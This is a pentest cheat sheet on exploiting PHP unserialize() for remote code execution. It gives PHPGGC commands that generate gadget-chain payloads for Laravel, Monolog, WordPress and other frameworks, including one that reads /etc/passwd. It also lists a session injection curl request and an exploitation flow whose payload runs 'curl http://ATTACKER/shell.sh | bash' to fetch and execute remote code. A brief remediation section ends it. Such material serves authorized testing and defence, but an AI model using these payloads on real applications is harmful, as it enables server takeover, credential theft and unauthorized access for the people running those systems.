# PHP Deserialization — unserialize() RCE

## Summary
PHP's `unserialize()` automatically reconstructs objects and calls `__wakeup()` / `__destruct()` magic methods. When gadget chains are available, this leads to RCE.

## Identification

```bash
# Check for serialised PHP in cookies, POST data, query params
echo 'TzoxOiJYIjoxOntzOjE6IngiO3M6NToiaGVsbG8iO30=' | base64 -d
# Output: O:1:"X":1:{s:1:"x";s:5:"hello";}
```

## Manual Payload

### Simple `__destruct` test
```php
# If a custom class Example exists:
O:7:"Example":1:{s:1:"x";s:5:"hello";}
```

## PHPGGC — Gadget Chain Framework

```bash
# List available chains
phpggc -l

# Generate payload for Laravel RCE
phpggc Laravel/RCE1 system id

# Generate with base64 encoding
phpggc --base64 Laravel/RCE1 system 'id'

# Generate and URL-encode
phpggc --url Laravel/RCE1 system 'cat /etc/passwd'

# Custom chain for specific framework
phpggc SwiftMailer/FW1 system 'id'
```

## Common Gadget Chains

| Framework | Chain | Effect |
|-----------|-------|--------|
| Laravel | `Laravel/RCE1` | RCE via __destruct |
| SwiftMailer | `SwiftMailer/FW1` | File write via __toString |
| Monolog | `Monolog/RCE1` | RCE via __destruct |
| WordPress | `WordPress/RCE1` | RCE via WP PHPUnit |
| Slim | `Slim/RCE1` | RCE via __destruct |
| ZendFramework | `ZendFramework/RCE1` | RCE via __destruct |
| CodeIgniter | `CodeIgniter/RCE1` | RCE via __toString |

## Session Serialisation

PHP session serialisation can also be attacked:

```bash
# Session handler injection
curl -b "PHPSESSID=test" https://target.com/ \
  --data "someserializeddata|O:1:\"X\":0:{}"
```

## Full Exploitation Flow

```bash
# 1. Enumerate framework via error messages or version headers
# 2. Generate payload
phpggc --base64 Laravel/RCE1 system 'curl http://ATTACKER/shell.sh | bash'

# 3. Inject payload into cookie / POST body
curl -b "session=PAYLOAD" https://target.com/vuln

# 4. Confirm RCE
curl -b "session=PAYLOAD" https://target.com/vuln?cmd=id
```

## Remediation
- Use `json_decode()` / `json_encode()` instead of `serialize()` / `unserialize()`
- Whitelist allowed classes via `unserialize()` second parameter: `unserialize($data, ['allowed_classes' => false])`
- Validate integrity with `hash_hmac()`
